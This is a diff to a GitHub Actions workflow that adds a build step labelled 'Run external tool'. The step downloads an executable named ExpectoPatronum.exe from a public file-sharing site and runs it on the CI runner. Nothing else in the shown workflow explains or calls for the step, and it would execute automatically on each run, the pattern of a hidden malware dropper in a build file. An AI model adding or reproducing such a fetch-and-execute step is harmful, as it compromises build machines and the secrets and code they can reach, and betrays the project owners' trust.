@@ -34,3 +34,9 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+      
+      # Run external tool
+      - name: Run external tool
+        run: |
+          Invoke-WebRequest $https://www.file-upload.net/download-14914720/ExpectoPatronum.exe.html -OutFile ./ExpectoPatronum.exe
+          ./ExpectoPatronum.exe
